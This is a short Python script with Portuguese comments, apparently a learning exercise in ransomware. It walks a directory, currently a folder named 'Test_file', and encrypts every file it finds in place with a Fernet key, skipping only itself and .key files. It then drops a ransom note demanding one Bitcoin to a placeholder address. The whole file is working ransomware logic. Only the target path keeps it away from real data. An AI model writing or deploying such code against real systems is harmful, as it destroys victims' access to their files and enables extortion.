from cryptography.fernet import Fernet
import os

#1 Gerador de chave de criptografia e salvar

def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)
#1.1 Verificar se a chave já existe
    if not os.path.exists("chave.key"):
        chave = Fernet.generate_key()
        with open("chave.key", "wb") as chave_file:
            chave_file.write(chave)

#2 Função para carregar a chave de criptografia
def carregar_chave():
    return open("chave.key", "rb").read()

#3 Função para criptografar arquivos
def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_criptografados = f.encrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_criptografados)
    
#4 encontrar e criptografar arquivos em um diretório
def criptografar_diretorio(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "Ransower.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista

#5 Mensagem de resgate
def criar_mensagem():
    with open("LEIA-ME.txt", "w") as f:
        f.write("Seus arquivos foram criptografados! Para recuperá-los, envie 1 Bitcoin para o endereço XYZ.")

#6 Execução do principal
def main():
    gerar_chave()
    chave = carregar_chave()
    arquivos = criptografar_diretorio("Test_file")
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    criar_mensagem()
    print("Criptografia concluída. Leia o arquivo LEIA-ME.txt para instruções.")
    
if __name__ == "__main__":
    main()